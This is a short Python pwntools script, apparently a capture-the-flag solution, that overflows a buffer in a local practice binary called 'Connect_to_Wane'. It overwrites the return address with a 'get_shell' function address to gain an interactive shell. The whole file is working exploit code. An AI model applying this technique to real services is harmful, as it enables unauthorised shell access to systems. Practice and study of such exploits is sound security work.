from pwn import *

p = remote("127.0.0.1", 26146)
#p = process("./Connect_to_Wane")
e = ELF("./Connect_to_Wane")

pay = b"A"*0x10 + p64(e.sym["get_shell"]+5)

p.sendlineafter(">> ", pay)

p.interactive()
